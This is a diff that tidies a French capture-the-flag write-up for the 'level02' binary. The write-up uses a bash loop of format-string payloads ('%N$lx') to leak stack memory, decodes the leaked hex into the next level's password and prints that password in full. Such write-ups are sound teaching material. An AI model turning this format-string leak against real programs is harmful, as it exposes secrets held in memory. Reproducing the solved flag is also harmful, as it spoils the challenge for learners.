@@ -1,4 +1,6 @@
-Le binaire level02 ne contient qu'une fonction **main**.
+# LEVEL 02
+
+Le binaire level02 ne contiens qu'une fonction **main**.
 
 Cette fonction appelle **open** de **"/home/users/level03/.pass"** suivi d'une comparaison menant à un **exit**, puis un **fread**.
 
@@ -18,7 +20,7 @@ IDX=0
 while [ $IDX -lt 361 ]
 do
 echo $IDX >> /tmp/hexmap
-(python -c "print '%$IDX\$lx ' + '\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  + '\n'") | ~/level02 | grep "access!" >> /tmp/hexmap   
+(python -c "print '%$IDX\$lx ' + '\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  + '\n'") | ~/level02 | grep "access!" >> /tmp/hexmap
 IDX=$((IDX+1))
 echo $IDX
 done
@@ -56,19 +58,19 @@ Puis convertir les valeurs de l'hexa vers la **table ascii**:
 <pre>
 
 
-	little endian	 => big endian		 => str	 	
-1.	756e505234376848 => 4868373452506e75 => Hh74RPnu 
-2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE 
-3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7 
-4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5 
-5.	48336750664b394d => d4394b6650673348 => M9KfPg3H 
+	little endian	 => big endian		 => str
+1.	756e505234376848 => 4868373452506e75 => Hh74RPnu
+2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE
+3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7
+4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5
+5.	48336750664b394d => d4394b6650673348 => M9KfPg3H
 0 => length 40
 
 
-passwd => Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H 
+passwd => Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 </pre>
 
-En le testant: 
+En le testant:
 <pre>
 ./level03
 "test"
